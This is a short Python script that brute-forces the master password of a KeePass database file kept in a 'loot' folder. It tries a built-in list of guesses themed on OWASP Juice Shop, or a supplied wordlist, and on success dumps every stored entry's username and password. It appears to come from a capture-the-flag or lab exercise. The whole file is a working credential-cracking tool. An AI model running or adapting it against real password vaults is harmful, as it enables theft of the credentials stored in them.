#!/usr/bin/env python3
"""Test candidate master passwords against incident-support.kdbx using pykeepass."""
import sys, time
from pykeepass import PyKeePass

DB = "/workspace/loot/incident-support.kdbx"

CANDIDATES = [
    "J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P",
    "incident-support", "Incident-Support", "incident_support", "incident support",
    "incidentsupport", "Incident-Support2026", "incident-support2026",
    "support", "Support", "support123", "Support123", "support1234", "Support2026",
    "incident", "Incident", "incident123", "Incident123", "incident2026",
    "keepass", "KeePass", "keepass123", "Keepass123", "keepass2026",
    "master", "master123", "MasterPassword", "masterpassword",
    "admin123", "ncc-1701", "private", "demo", "SlurmCl4ssic", "slurmCl4ssic",
    "juice-shop", "juiceshop", "juiceshop123", "owasp", "OWASP", "owasp2026",
    "security", "changeme", "123456", "password", "Password123", "c8", "C8",
    "kdbx", "secret", "s3cr3t", "supersecret", "Private", "Private!",
    "juicy", "Juicy", "juice", "Juice", "juice123",
    "support@juice-sh.op", "support@juice-sh.op123",
]

def main():
    cands = CANDIDATES
    if len(sys.argv) > 1:
        with open(sys.argv[1], encoding="utf-8", errors="replace") as f:
            cands = [l.rstrip("\n") for l in f if l.strip()]
    t0 = time.time()
    for i, pw in enumerate(cands, 1):
        try:
            kp = PyKeePass(DB, password=pw)
            print(f"[+] FOUND master password: {pw!r}")
            for e in kp.entries:
                print("  entry:", e.title, "| user:", e.username, "| pass:", e.password)
            return 0
        except Exception:
            pass
        if i % 100 == 0:
            print(f"    tried {i}/{len(cands)} ({time.time()-t0:.1f}s)", file=sys.stderr)
    print(f"[-] none of {len(cands)} candidates worked ({time.time()-t0:.1f}s)")
    return 1

if __name__ == "__main__":
    sys.exit(main())
